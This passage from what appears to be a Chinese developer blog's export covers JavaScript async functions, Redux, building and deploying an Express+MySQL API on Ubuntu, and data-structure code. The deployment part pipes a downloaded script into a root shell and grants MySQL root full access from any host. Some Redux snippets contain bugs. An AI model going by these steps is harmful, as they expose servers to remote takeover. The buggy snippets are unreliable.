&#123; step(function() &#123; return gen.next(v); &#125;); &#125;, function(e) &#123; step(function() &#123; return gen.throw(e); &#125;); &#125;); &#125; step(function() &#123; return gen.next(undefined); &#125;); &#125;);&#125; 与其他异步方法的比较假定某个 DOM 元素上面，部署了一系列的动画，前一个动画结束，才能开始后一个。如果当中有一个动画出错，就不再往下执行，返回上一个成功执行的动画的返回值。 Promise： 123456789101112131415161718192021222324function chainAnimationsPromise(elem, animations) &#123; // 变量ret用来保存上一个动画的返回值 let ret = null; // 新建一个空的Promise let p = Promise.resolve(); // 使用then方法，添加所有动画 for(let anim of animations) &#123; p = p.then(function(val) &#123; ret = val; return anim(elem); &#125;); &#125; // 返回一个部署了错误捕捉机制的Promise return p.catch(function(e) &#123; /* 忽略错误，继续执行 */ &#125;).then(function() &#123; return ret; &#125;);&#125; Generator： 123456789101112131415function chainAnimationsGenerator(elem, animations) &#123; return spawn(function*() &#123; let ret = null; try &#123; for(let anim of animations) &#123; ret = yield anim(elem); &#125; &#125; catch(e) &#123; /* 忽略错误，继续执行 */ &#125; return ret; &#125;);&#125; async： 1234567891011async function chainAnimationsAsync(elem, animations) &#123; let ret = null; try &#123; for(let anim of animations) &#123; ret = await anim(elem); &#125; &#125; catch(e) &#123; /* 忽略错误，继续执行 */ &#125; return ret;&#125; Async 函数的实现最简洁，最符合语义，容易理解，几乎没有语义不相关的代码，并且不需要自己提供自动执行器。 按顺序完成异步操作123456789101112131415161718192021//继发async function logInOrder(urls) &#123; for (const url of urls) &#123; const response = await fetch(url); console.log(await response.text()); &#125;&#125;//并发async function logInOrder(urls) &#123; // 并发读取远程URL const textPromises = urls.map(async url =&gt; &#123; const response = await fetch(url); return response.text(); &#125;); // 按次序输出 for (const textPromise of textPromises) &#123; console.log(await textPromise); &#125;&#125; 虽然map方法的参数是async函数，但它是并发执行的，因为只有async函数内部是继发执行，外部不受影响。","categories":[],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"http://yoursite.com/tags/Javascript/"},{"name":"ES6","slug":"ES6","permalink":"http://yoursite.com/tags/ES6/"}]},{"title":"Redux学习笔记","slug":"Redux学习笔记","date":"2019-07-25T07:10:35.000Z","updated":"2019-08-10T06:15:02.080Z","comments":true,"path":"2019/07/25/Redux学习笔记/","link":"","permalink":"http://yoursite.com/2019/07/25/Redux学习笔记/","excerpt":"","text":"介绍前述Redux：JavaScript 状态容器，可预测的状态管理机 。Redux的思想继承自Facebook的Flux架构，但比Flux更加简洁易用。 安装稳定版： 1npm install --save redux 多数情况下，还需要使用React 绑定库和开发者工具 12npm install --save react-reduxnpm install --save-dev redux-devtools 主要组成Redux应用的主要组成为：action、reducer、store。 action：是Redux中信息的载体， store 的唯一信息来源。一般通过 store.dispatch() 将 action 传到 store。 reducer：根据action做出相应响应，决定如何修改应用的状态state。需要在编写reducer前设计好state，state包含服务器获取的数据和UI状态。 reducer是一个纯函数，它接受两个参数，当前的state和action，返回新的state。 (previousState, action) =&gt; newState store：是Redux的一个对象，也是action和reducer之间的桥梁。主要负责： 保存应用状态 通过方法getState()访问应用状态 通过方法dispatch(action)发送更新状态的意图 通过方法subscribe(listener)注册监听函数、监听应用状态的改变 一个Redux应用只有一个store，store保存了唯一数据源。store通过createStore()创建，创建时需要传递reducer作为参数。 主要组成部分之间关系的简单示例当使用普通对象来描述应用的 state 时。例如，todo 应用的 state 可能长这样： 12345678910&#123; todos: [&#123; text: 'Eat food', completed: true &#125;, &#123; text: 'Exercise', completed: false &#125;], visibilityFilter: 'SHOW_COMPLETED'&#125; 要想更新 state 中的数据，需要发起一个 action。Action 就是一个普通 JavaScript 对象，用来描述发生了什么。下面是一些 action 的示例： 123&#123; type: 'ADD_TODO', text: 'Go to swimming pool' &#125;&#123; type: 'TOGGLE_TODO', index: 1 &#125;&#123; type: 'SET_VISIBILITY_FILTER', filter: 'SHOW_ALL' &#125; 强制使用 action 来描述所有变化带来的好处是可以清晰地知道应用中到底发生了什么。如果一些东西改变了，就可以知道为什么变。action 就像是描述发生了什么的指示器。最终，为了把 action 和 state 串起来，我们需要开发一些函数，也就是 reducer。reducer 是接收 state 和 action作为参数并返回新的 state 的函数。 对于较大的应用来说，不可能仅仅写一个这样的函数，所以我们需要编写很多小函数来分别管理 state 的一部分： 12345678910111213141516171819202122function todos(state = [], action) &#123; switch (action.type) &#123; case 'ADD_TODO': return state.concat([&#123; text: action.text, completed: false &#125;]) case 'TOGGLE_TODO': return state.map((todo, index) =&gt; action.index === index ? &#123; text: todo.text, completed: !todo.completed &#125; : todo ) default: return state &#125;&#125;function visibilityFilter(state = 'SHOW_ALL', action) &#123; if (action.type === 'SET_VISIBILITY_FILTER') &#123; return action.filter &#125; else &#123; return state &#125;&#125; 可以再构建一个 reducer 调用上面两个 reducer 以管理整个应用的 state： 123456function todoApp(state = &#123;&#125;, action) &#123; return &#123; todos: todos(state.todos, action), visibilityFilter: visibilityFilter(state.visibilityFilter, action) &#125;&#125; 三大原则单一数据源整个应用的 state 被储存在一棵 object tree 中，并且这个 object tree 只存在于唯一一个 store 中。 这让同构应用开发变得非常容易。来自服务端的 state 可以在无需编写更多代码的情况下被序列化并注入到客户端中。由于是单一的 state tree ，调试也变得非常容易。在开发中，可以把应用的 state 保存在本地以加快开发速度。此外，受益于单一的 state tree ，以前难以实现的如“撤销/重做”这类功能也变得轻而易举。 State 只读唯一改变 state 的方法就是触发 action，action 是一个用于描述已发生事件的普通对象。 这样确保了视图和网络请求都不能直接修改 state，它们只能表达想要修改的意图。因为所有的修改都被集中化处理，且严格按照顺序执行，因此不用担心竞态条件（race condition）的出现。 Action 就是普通对象而已，它们可以被日志打印、序列化、储存、或在测试时回放出来。 使用纯函数执行修改为了描述 action 如何改变 state tree ，我们需要编写 reducers。 Reducer 只是一些纯函数，它接收先前的 state 和 action，并返回新的 state。刚开始可以只有一个 reducer，随着应用变大，你可以把它拆成多个小的 reducers，分别独立地操作 state tree 的不同部分。因为 reducer 只是函数，我们可以控制它们被调用的顺序，传入附加数据，编写可复用的 reducer 来处理一些通用任务，如分页器。 Actionaction用于描述应用发生了什么操作。 构建Action 本质上是 JavaScript 普通对象。我们约定，action 内必须使用一个字符串类型的 type字段来表示将要执行的动作。多数情况下，type 会被定义成字符串常量。 除了 type 字段外，action 对象的结构由实际业务场景决定（可参照 Flux 标准 Action 获取关于如何构造 action 的建议）。 我们还需要再添加一个 action index 来表示用户完成任务的动作序列号。因为数据是存放在数组中的，所以我们通过下标 index 来引用特定的任务。而实际项目中一般会在新建数据的时候生成唯一的 ID 作为数据的引用标识。 通过action creator创建action，如下所示是以todos应用为示例的actions.js： 12345678910111213141516171819202122/*actions.js*/export const ADD_TODO = 'ADD_TODO'export const TOGGLE_TODO = 'TOGGLE_TODO'export const SET_VISIBILITY_FILTER = 'SET_VISIBILITY_FILTER'//筛选todo列表的filtersexport const VisibilityFilters = &#123; SHOW_ALL: 'SHOW_ALL', SHOW_COMPLETED: 'SHOW_COMPLETED', SHOW_ACTIVE: 'SHOW_ACTIVE'&#125;//action creatorsexport function addTodo (text) &#123; return &#123; type: ADD_TODO, text &#125;&#125;export function toggleTodo (index) &#123; return &#123; type: TOGGLE_TODO, index &#125;&#125;export function setVisibilityFilter (filter) &#123; return &#123; type: SET_VISIBILITY_FILTER, filter &#125;&#125; 简化可以看到action creators的这些function都很相似，我们可以构造一个用于生成 action creator 的函数来简化样板代码。 12345678910111213141516171819function makeActionCreator(type, ...argNames) &#123; return function(...args) &#123; const action = &#123; type &#125; argNames.forEach((arg, index) =&gt; &#123; action[argNames[index]] = args[index] &#125;) return action &#125;&#125;//定义常量const ADD_TODO = 'ADD_TODO'const EDIT_TODO = 'EDIT_TODO'const REMOVE_TODO = 'REMOVE_TODO'//使用makeActionCreatorexport const addTodo = makeActionCreator(ADD_TODO, 'text')export const editTodo = makeActionCreator(EDIT_TODO, 'id', 'text')export const removeTodo = makeActionCreator(REMOVE_TODO, 'id') Reducerreducer根据action做出响应，决定如何修改应用的状态state。 构建首先设计state，以todos应用为例： 12345678910&#123; todos: [&#123; text: 'Learn React', completed: true &#125;, &#123; text: 'Learn Redux', completed: false &#125;], visibilityFilter: 'SHOW_COMPLETED'&#125; 然后尝试创建一个最基本的reducer： 1234567891011121314151617181920212223242526272829303132333435import &#123; VisibilityFilters &#125; from './actions'const initialState = &#123; todos: [], visibilityFilter: VisibilityFilters.SHOW_ALL&#125;//reducerfunction todoApp(state = initialState, action) &#123; switch (action.type) &#123; case SET_VISIBILITY_FILTER: return &#123; ...state, visibilityFilter: action.filter &#125; case ADD_TODO: return &#123; ...state, todos: [ ...state.todos, &#123; text: action.text, completed: false &#125; ] &#125; case TOGGLE_TODO: return &#123; ...state, todos: state.todos.map( (todo, index) =&gt; &#123; if(index === action.index) &#123; return &#123; ...todo, completed: !todo.completed &#125; &#125; &#125;) &#125; default: return state &#125;&#125; 注：除了利用扩展运算符(…)创建新的state对象，还可以使用ES6的Object.assign() Object.assign() 方法用于将所有可枚举属性的值从一个或多个源对象复制到目标对象并返回目标对象。 语法：Object.assign(target, …sources); 1234567891011function todoApp(state = initialState, action) &#123; switch (action.type) &#123; case SET_VISIBILITY_FILTER: return Object.assign(&#123;&#125;, state, &#123; visibilityFilter: action.filter &#125;) //...其他的case也类似 default: return state &#125;&#125; 上面我们使用todoApp一个reducer处理所有的action，当应用变得复杂时，todoApp也会变得更加复杂，这时需要拆分出多个reducer，每个reducer处理state中的部分状态。 1234567891011121314151617181920212223242526272829303132333435//处理todo的reducerfunction todos (state = [], action) &#123; switch (action.type) &#123; case 'ADD_TODO': return state.concat([&#123; text: action.text, completed: false &#125;]) case 'TOGGLE_TODO': return state.map( (todo, index) =&gt; &#123; action.index === index ? &#123; ...todo, completed: !todo.completed &#125; : todo &#125; ) default: return state &#125;&#125;//处理visibilityFilter的reducerfunction visibilityFilter (state = 'SHOW_ALL', action) &#123; switch (action.type) &#123; case SET_VISIBILITY_FILTER: return action.filter default: return state &#125;&#125;//简化后的todoAppfunction todoApp (state = &#123;&#125;, action) &#123; return &#123; todos: todos(state.todos, action), visibilityFilter: visibilityFilter(state.visibilityFilter, action) &#125;&#125; Redux提供了一个combineReducers()函数，用于合并多个reducer。可以使用combineReducers()对todoApp进行进一步改写： 123456import &#123; combineReducers &#125; from 'redux'const todoApp = combineReducers(&#123; todos, visibilityFilter&#125;) 简化与action creater部分的简化方式类似，我们可以创建一个Reducers生成器，将action types映射到对应的handlers，取代之前用的switch： 1234567891011121314151617function createReducer (initialState, handlers) &#123; return function reducer(state = initialState, action) &#123; if (handlers.hasOwnProperty(action.type)) &#123; return handlers[action.type](state, action) &#125; else &#123; return state &#125; &#125;&#125;//使用createReducerexport const todos = createReducer([], &#123; [ActionTypes.ADD_TODO]: (state, action) =&gt; &#123; //这里传入的state是state.todos const text = action.text.trim() return [...state, &#123; text: text, completed: false &#125;] &#125;&#125;) 注意点！永远不要在 reducer 里做这些操作： 修改传入参数； 执行有副作用的操作，如 API 请求和路由跳转； 调用非纯函数，如 Date.now() 或 Math.random()。 reducer 一定要保持纯净。只要传入参数相同，返回计算得到的下一个 state 就一定相同。没有特殊情况，没有副作用，没有 API 请求，没有变量修改，单纯执行计算。 StoreStore 是把action和reducer联系到一起的桥梁。Store 有以下职责： 维持应用的 state； 提供 getState() 方法获取 state； 提供 dispatch(action)方法更新 state； 通过 subscribe(listener)注册监听器； 通过 subscribe(listener)返回的函数注销监听器。 再次注意 Redux 应用只有一个store。当需要拆分数据处理逻辑时，应该使用 reducer 组合而不是创建多个 store。 构建123456import &#123; createStore &#125; from 'redux'import todoApp from './reducers'let store = createStore(todoApp)//注：createStore的第二个参数是可选的，用于设置state的初始状态let store = createStore(todoApp, initialState) 发起Actions123456789101112131415161718192021222324import &#123; addTodo, toggleTodo, setVisibilityFilter, VisibilityFilters&#125; from './actions'//打印初始状态console.log(store.getState())//每次 state 更新时，打印日志//subscribe() 返回一个函数用来注销监听器const unsubscribe = store.subscribe(() =&gt; console.log(store.getState()))//发起actionsstore.dispatch(addTodo('learn actions'))store.dispatch(addTodo('learn reducers'))store.dispatch(addTodo('learn store'))store.dispatch(toggleTodo(0))store.dispatch(toggleTodo(1))store.dispatch(setVisibilityFilter(VisibilityFilters.SHOW_COMPLETED))//停止监听 state 更新unsubscribe() 数据流严格的单向数据流是 Redux 架构的设计核心。 这意味着应用中所有的数据都遵循相同的生命周期，这样可以让应用变得更加可预测且容易理解。同时也鼓励做数据范式化，这样可以避免使用多个且独立的无法相互引用的重复数据。 Redux 应用中数据的生命周期遵循下面 4 个步骤： 调用 store.dispatch(action)。 store 调用传入的 reducer 函数。 根 reducer 把多个子 reducer 的输出合并成单一的 state 树。 store 保存根 reducer 返回的完整 state 树。 新的树就是应用的下一个 state，所有订阅 store.subscribe(listener)的监听器都将被调用；监听器里可以调用 store.getState() 获得当前 state，可以应用新的 state 来更新 UI。 在React中使用Redux展示组件与容器组件 展示组件 容器组件 作用 描述如何展现（骨架、样式） 描述如何运行（数据获取、状态更新） 直接使用 Redux 否 是 数据来源 props 监听 Redux state 数据修改 从 props 调用回调函数 向 Redux 派发 actions 调用方式 手动 通常由 React Redux 生成 展示组件展示组件只定义外观而不考虑数据来源和如何改变。如果把代码从 Redux 迁移到别的架构，这些组件可以不做任何改动直接使用，它们并不依赖于 Redux。 容器组件容器组件用于把展示组件连接到 Redux 。例如，展示型的 TodoList 组件需要一个类似 VisibleTodoList 的容器来监听 Redux store 变化并处理如何过滤出要显示的数据，VisibleTodoList根据当前显示的状态来对 todo 列表进行过滤，并渲染 TodoList。 connectreact-redux提供了一个connect函数，用于把React组件和Redux store连接起来，生成一个容器组件，负责数据管理和业务逻辑。 1234import &#123; connect &#125; from 'react-redux'import TodoList from './TodoList'const VisibleTodoList = connect()(TodoList); 在这里VisibleTodoList需要承担两个工作： 从 Redux store 中获取展示组件所需的应用状态 把展示组件的状态变化同步到 store 中 通过为connect传递两个函数作为参数可以让VisibleTodoList具备这两个功能： 1234567import &#123; connect &#125; from 'react-redux'import TodoList from './TodoList'const VisibleTodoList = connect( mapStateToProps, mapDispatchToProps)(TodoList); mapStateToProps第一个函数的作用是把state转换成props，state是store中保存的应用状态，它会作为参数传递给mapStateToProps，props就是被连接的展示组件的props。 以筛选Todos列表为例： 1// 每当store中的state更新时mapStateToProps就会重新执行传给组件新的props。 mapStateToProps除了接收state参数外还可以传入第二个参数作为容器组件的props对象。 mapDispatchToProps第二个函数的作用是发送action更新state，函数接收store.dispatch作为参数并返回展示组件用来修改state的函数。 1234567891011function toggleTodo(id) &#123; return &#123; type: 'TOGGLE_TODO', id &#125;&#125;function mapDispatchToProps(dispatch) &#123; return &#123; onTodoClick: function(id) &#123; dispatch(toggleTodo(id)) &#125; &#125;&#125; 这样展示组件就可以调用this.props.onTodoClick(id)发送修改待办事项状态的action了。与mapStateToProps相同，mapDispatchToProps也支持第二个参数代表容器组件的props。 Provider组件通过connect创建出的容器组件通过Provider组件获取Redux store。Provider需要接收一个store属性，并把store属性保存到context，Provider通过context把store传递给子组件。 所以一般把Provider组件作为根组件，使内层的任意组件可以从context中获取store对象。 12345678910111213import &#123; render &#125; from &apos;react-dom&apos;import &#123; createStore &#125; from &apos;react-redux&apos;import todoApp from &apos;./reducers&apos;import App from &apos;./components/App&apos;let store = createStore(todoApp)render( &lt;Provider store=&#123;store&#125;&gt; &lt;App /&gt; &lt;/Provider&gt;, document.getElementById(&apos;root&apos;)); 中间件Redux middleware 提供的是位于 action 被发起之后，到达 reducer 之前的扩展点。 可以利用 Redux middleware 来进行日志记录、创建错误报告、调用异步接口或者路由等等。 现在模拟日志记录和打印错误信息的中间件：（抽象并整合后的形式） 123456789101112131415161718192021const logger = store =&gt; next =&gt; action =&gt; &#123; console.log('dispatching', action) let result = next(action) console.log('next state', store.getState()) return result&#125;const errReporter = store =&gt; next =&gt; action =&gt; &#123; try &#123; return next(action) &#125; catch (err) &#123; console.error('Caught an exception!', err) Raven.captureException(err, &#123; extra: &#123; action, state: store.getState() &#125; &#125;) throw err &#125;&#125; 引用方式： 12345678import &#123; createStore, combineReducers, applyMiddleware &#125; from 'redux'const todoApp = combineReducers(reducers)const store = createStore( todoApp, // applyMiddleware() 告诉 createStore() 如何处理中间件 applyMiddleware(logger, errReporter)) 现在任何被发送到 store 的 action 都会经过 logger 和 errReporter： 12// 将经过 logger 和 errReporter 两个中间件store.dispatch(addTodo('Use Middlewares')) applyMiddleware()的实现： 1234567891011121314151617181920export default function applyMiddleware (...middlewares) &#123; return (createStore) =&gt; (...args) =&gt; &#123; const store = createStore(...args) let dispatch = store.dispatch let chain = [] const middlewareAPI = &#123; getState: store.getState, dispatch: (...args) =&gt; dispatch(...args) &#125; chain = middlewares.map(middleware =&gt; middleware(middlewareAPI)) dispatch = compose(...chain)(store.dispatch) return &#123; ...store, dispatch &#125; &#125;&#125; compose(f,g,h)等价于(…args) =&gt; f(g(h(args))) 异步Redux中处理异步操作需要借助中间件的帮助，redux-thunk是处理异步操作最常用的中间件。可以使用 applyMiddleware() 来增强 createStore()。 12345678import &#123; createStore, applyMiddleware &#125; from 'redux'import thunk from 'redux-thunk'import reducer from './reducers'const store = createStore( reducer, applyMiddleware(thunk)); 处理一个网络请求会使用三个action，分别表示请求开始、请求成功和请求失败。 123&#123; type: 'FETCH_DATA_REQUEST' &#125;&#123; type: 'FETCH_DATA_SUCCESS', data: &#123;...&#125; &#125;&#123; type: 'FETCH_DATA_FAILURE', error: 'something wrong...' &#125; 定义一个异步action模拟向服务器请求数据： 123456789101112131415161718function getData (url) &#123; return function (dispatch) &#123; dispatch(&#123; type: 'FETCH_DATA_REQUEST' &#125;) return fetch (url) .then( res =&gt; res.json(), err =&gt; &#123; console.log(err) dispatch(&#123; type: 'FETCH_DATA_FAILURE', error: 'something wrong...' &#125;) &#125; ) .then(json =&gt; dispatch(&#123;type: 'FETCH_DATA_SUCCESS', data: json&#125;) ) &#125;&#125;store.dispatch(getData(url)); 异步数据流的处理： 像 redux-thunk 或 redux-promise 这样支持异步的 middleware 都包装了 store 的 dispatch()方法，可以 dispatch 一些除了 action 以外的其他内容，例如：函数或者 Promise。使用的任何 middleware 都可以通过自己的方式解析 dispatch 的内容并继续传递 actions 给下一个 middleware。 middleware 链中的最后一个中间件 dispatch 的 action 必须是一个普通对象。我们可以使用任意多异步的 middleware 去做想做的事情，但是需要使用普通对象作为最后一个被 dispatch 的 action ，来将处理流程带回同步方式。 参考及学习资料 《React进阶之路》—— 徐超 《深入React技术栈》—— 陈屹 https://github.com/brickspert/blog/issues/22 通俗易懂的好文 http://cn.redux.js.org Redux中文文档","categories":[],"tags":[{"name":"Redux","slug":"Redux","permalink":"http://yoursite.com/tags/Redux/"}]},{"title":"使用express+MySQL实现数据接口并部署","slug":"使用express-MySQL实现数据接口并部署","date":"2019-07-08T14:20:58.000Z","updated":"2019-08-03T05:21:01.140Z","comments":true,"path":"2019/07/08/使用express-MySQL实现数据接口并部署/","link":"","permalink":"http://yoursite.com/2019/07/08/使用express-MySQL实现数据接口并部署/","excerpt":"","text":"创建123npm initnpm install express --savenpm install ejs 创建main.js（init的时候选的文件名）和api、config、routers、src、views文件夹 项目结构 12345678910111213|── main.js //入口文件|── src //静态资源目录│ ├── css│ ├── js│ └── images|── api //接口目录│ └── addUser.js //接口文件|—— config //配置文件目录| └── config.json|—— routers //路由文件目录| └── index.js|—— views //模板文件目录| └── index.ejs 实现main.js 1234567891011121314151617181920212223242526272829const express = require('express');const app = express();/*文件路径处理*/const path = require('path');/*页面模板view处理*/app.set('views', path.join(__dirname, 'views'));app.set('view engine', 'ejs');/*页面静态文件处理*/app.use(express.static('src'));/*页面路由处理*/const index = require('./routers/index');app.use('/', index);/*接口路由处理*/const addUser = require('./api/addUser');app.use('/addUser', addUser);/*接口数据body解析处理*/const bodyParser = require('body-parser');app.use(bodyParser.json());app.use(bodyParser.urlencoded(&#123; extended : false &#125;));const server = app.listen(9000, function () &#123; console.log('success!');&#125;) routers&gt;index.js 123456789const express = require('express');const router = express.Router();/*设置首页路由get请求*/router.get('/', function(req, res, next)&#123; res.render('index', &#123;title: 'Try express'&#125;);&#125;)module.exports = router; views&gt;index.ejs 12345678910111213141516171819202122232425&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;&lt;%= title %&gt;&lt;/title&gt; &lt;link rel='stylesheet' type=\"text/css\" href=\"/css/style.css\"&gt; &lt;script src=\"/js/jquery-3.1.1.min.js\"&gt;&lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;input id='name' name='name' type=\"text\"/ placeholder=\"输入用户名\"&gt; &lt;input id='btn' type=\"button\" value=\"提交\"/&gt; &lt;script&gt; $('#btn').on('click', function()&#123; let name = $('#name').val(); console.log(name); $.post('/addUser', &#123;name: name&#125;, function(data)&#123; console.log(data); alert('添加成功！'); &#125;); &#125;) &lt;/script&gt; &lt;/body&gt;&lt;/html&gt; config&gt;config.json配置mysql信息 1234567&#123; \"host\": \"ip\", \"port\": \"端口号\", \"user\": \"用户名\", \"password\": \"密码\", \"database\": \"数据库名称\"&#125; api&gt;addUser.js 123456789101112131415161718192021222324252627282930313233const express = require('express');const router = express.Router();const mysql = require('mysql');const config = require('../config/config.json');router.post('/', function(req, res)&#123; /*连接数据库*/ const connection = mysql.createConnection(config); connection.connect(); /*获取传进来的参数*/ var name = req.body.name || ''; /*构建添加用户语句，ID属性为auto_increment*/ var sql = \"insert into user values(\" + \"null,\" + connection.escape(name) + \")\"; //console.log(sql); /*向数据库添加数据*/ connection.query(sql, function(err, rows, fields)&#123; /*返回response*/ res.send(&#123; status: 200, data: rows, err: err, message: \"success\" &#125;) &#125;); connection.end();&#125;)module.exports = router; 数据库连接问题本地连接问题报错client does not support authentication 的解决办法： 12mysql&gt; alter user &apos;用户名&apos;@&apos;localhost&apos; identified with mysql_native_password by &apos;密码&apos;;mysql&gt; flush privileges; 远程连接问题连接服务器数据库，被拒绝服务。 解决办法：Ubuntu设置MySQL允许远程访问，参考：链接 1&gt; sudo vim /etc/mysql/mysql.conf.d/mysqld.cnf 将bind-address = 127.0.0.1注释掉； 给root授予在任意主机（%）访问任意数据库的所有权限 1mysql&gt; grant all privileges on *.* to &apos;root&apos;@&apos;%&apos; identified by &apos;密码&apos; with grant option; 或者把root用户修改成允许远程主机访问 12mysql&gt; update user set host=&apos;%&apos; where user=&apos;root&apos; and host=&apos;localhost&apos;;mysql&gt; flush privileges; 完成后退出并重启mysql 1&gt;sudo service mysql restart 在Ubuntu服务器上配置node环境安装nodejs第一种办法： 123456789sudo apt updatesudo apt install nodejssudo apt install npmsudo apt install nodejs-legacynpm config set registry http://registry.npm.taobao.org/sudo npm install n -gsudo n stable 第二种办法：（安装指定版本） 如安装Node.js v12.x： 123# Using Ubuntucurl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash -sudo apt-get install -y nodejs 安装Express并运行12345678sudo npm install express-generator -g#创建web应用程序express express-appcd express-appnpm install#测试并启动DEBUG=myapp:* npm start 可以在服务器的3000端口访问到这个express应用 安装pm212345sudo npm install pm2 -gcd ~/express-app/#使用pm2进程管理器运行express应用pm2 start ./bin/www 如图所示，express应用正在pm2中运行，名称为www，id为0 显示更多信息 1pm2 show www 查看日志 1pm2 logs www 设置开机自启 12pm2 startup systemdsudo env PATH=$PATH:/usr/local/bin /usr/local/lib/node_modules/pm2/bin/pm2 startup systemd -u ubuntu --hp /home/ubuntu 参考：这里是链接","categories":[],"tags":[{"name":"Node.js","slug":"Node-js","permalink":"http://yoursite.com/tags/Node-js/"},{"name":"Express","slug":"Express","permalink":"http://yoursite.com/tags/Express/"},{"name":"MySQL","slug":"MySQL","permalink":"http://yoursite.com/tags/MySQL/"}]},{"title":"JavaScript数据结构与算法学习","slug":"JavaScript数据结构与算法学习","date":"2019-07-05T09:34:30.000Z","updated":"2019-11-22T14:35:07.654Z","comments":true,"path":"2019/07/05/JavaScript数据结构与算法学习/","link":"","permalink":"http://yoursite.com/2019/07/05/JavaScript数据结构与算法学习/","excerpt":"","text":"数组添加、插入元素1234567891011121314var numbers = [0,1,2,3,4,5];//向数组尾部添加number.push(6);number.push(7,8,9); //[0,1,2,3,4,5,6,7,8,9]//插入元素到首位for (var i = numbers.length; i &gt;= 0; i--) &#123; numbers[i] = numbers[i-1];&#125;numbers[0] = -1;//或者用unshift()方法numbers.unshift(-2);numbers.unshift(-5,-4,-3); //[-5,-4,-3,-2,-1,0,1,2,3,4,5,6,7,8,9]//在任意位置添加元素(比如在位置5插入1,2,3)splice(5,0,1,2,3) //因为在这里不删元素，所以第二个参数为零 删除元素12345678910//删除末尾元素numbers.pop();//删除首位元素for (var i = 0; i &lt; numbers.length; i++) &#123; numbers[i] = numbers[i+1];&#125;//或者用shift()方法numbers.shift();//在任意位置删除元素(比如在位置5删除3个元素，即删掉了位置5、6、7上的元素)numbers.splice(5,3); 合并数组1234var zero = 0;var positiveNumbers = [1,2,3];var negativeNumbers = [-1,-2,-3];var numbers = negativeNumbers.concat(zero, positiveNumbers); 数组的迭代器函数12345678910111213141516171819//遍历numbers.forEach(x =&gt; &#123; console.log(x);&#125;);for (let n of numbers) &#123; console.log(n);&#125;//一个判断是否为偶数的函数var isEven = (x) =&gt; &#123; return (x % 2 == 0) ? true : false;&#125;numbers.every(isEven); //false；全部为偶才返回truenumbers.some(isEven); //true；只要存在偶数就返回truenumbers.map(isEven); // [false, true, false, true, false, true, false, true, false, true]；返回结果数组numbers.filter(isEven); //[2, 4, 6, 8, 10]；返回所有符合条件的元素所组成的数组//reduce()会将每次的结果叠加到累加器，执行结束返回累加器的值numbers.reduce(function(prev, curr, index) &#123; //数组求和 return prev + curr;&#125;); 数组排序123456789101112//逆序numbers.reverse();//升序numbers.sort((a,b) =&gt; &#123; if (a &lt; b) &#123; return -1; &#125; if (a &gt; b) &#123; return 1; &#125; return 0;&#125;); 栈 (后进先出LIFO)123456789101112function Stack () &#123; let items = []; //保存栈中的元素 //向栈添加元素 this.push = function(element) &#123; items.push(element); &#125; //从栈移除元素 this.pop = function() &#123; return items.pop(); &#125;&#125; 用ES6的class创建： 123456789class Stack &#123; constructor () &#123; this.items = []; &#125; push(element) &#123; this.items.push(element); &#125; //其他方法与上述写法类似&#125; 例子：用栈实现十进制转二进制的函数 1234567891011121314151617function divideBy2(dec) &#123; var remStack = new Stack(), rem, binaryString = ''; while (dec &gt; 0) &#123; rem = Math.floor(dec % 2); remStack.push(rem); dec = Math.floor(dec / 2); &#125; while (!remStack.isEmpty()) &#123; binaryString += remStack.pop().toString(); &#125; return binaryString;&#125; 队列 (先进先出FIFO)1234567891011121314151617181920212223242526272829function Queue () &#123; let items = []; //向队列添加元素 this.enqueue = function(element) &#123; items.push(element); &#125; //从队列移除元素 this.dequeue = function() &#123; return items.shift(); &#125; //查看队头元素 this.front = function() &#123; return items[0]; &#125; //检查队列是否为空 this.isEmpty = function() &#123; return items.length == 0; &#125; //打印队列元素个数 this.size = function() &#123; return items.length; &#125; //打印队列元素 this.print = function() &#123; console.log(items.toString()); &#125;&#125;let queue = new Queue();queue.enqueue('Nancy'); 优先队列（对应的优先级数字越小优先级越高） 1234567891011121314151617181920212223242526272829function PriorityQueue() &#123; let items = []; function QueueElement (element, priority) &#123; this.element = element; this.priority = priority; &#125; this.enqueue = function(element, priority) &#123; let queueElement = new QueueElement(element, priority); let added = false; for (let i = 0; i &lt; items.length; i++) &#123; if (queueElement.priority &lt; items[i].priority) &#123; items.splice(i,0,queueElement); added = true; break; &#125; &#125; if (!added) &#123; items.push(queueElement); &#125; &#125;; this.print = function() &#123; for (let i = 0; i &lt; items.length; i++) &#123; console.log(`$&#123;items[i].element&#125;,$&#123;items[i].priority&#125;`); &#125; &#125;; //其他方法与普通队列一致&#125; 链表普通链表123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124function LinkedList() &#123; //创建Node类表示链表项 let Node = function(element) &#123; this.element = element; this.next = null; &#125; let length = 0; let head = null; //向链表末尾追加节点 this.append = function(element) &#123; let node = new Node(element), current; if(head == null) &#123; head = node; &#125; else &#123; current = head; while(current.next) &#123; current = current.next; &#125; current.next = node; &#125; length++; &#125;; //删除指定位置的节点 this.removeAt = function(position) &#123; if(position &gt; -1 &amp;&amp; position &lt; length) &#123; let current = head, previous, index = 0; if(position === 0) &#123; head = current.next; &#125; else &#123; while(index++ &lt; position) &#123; previous = current; current = current.next; &#125; previous.next = current.next; &#125; length--; return current.element; &#125; else &#123; return null; &#125; &#125; //在任意位置插入节点 this.insert = function(position, element) &#123; if(position &gt;= 0 &amp;&amp; position &lt;= length) &#123; let node = new Node(element), current = head, previous, index = 0; if(position === 0)&#123; node.next = current; head = node; &#125; else &#123; while(index++ &lt; position) &#123; previous = current; current = current.next; &#125; node.next = current; previous.next = node; &#125; length++; return true; &#125; else &#123; return false; &#125; &#125;; //把LinkedList对象转换成字符串 this.toString = function() &#123; let current = head, string = ''; while(current)&#123; string += current.element + (current.next ? '\\n' : ''); current = current.next; &#125; return string; &#125;; //返回节点对应的索引值 this.indexOf = function(element) &#123; let current = head; index = 0; while(current) &#123; if(current.element === element) &#123; return index; &#125; index++; current = current.next; &#125; return -1; &#125;; //判空 this.isEmpty = function() &#123; return length === 0; &#125;; //获取链表长度 this.size = function() &#123; return length; &#125;; //获取头节点 this.getHead = function() &#123; return head; &#125;&#125; 双向链表123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081function DoublyLinkedList() &#123; let Node = function(element) &#123; this.element = element; this.prev = 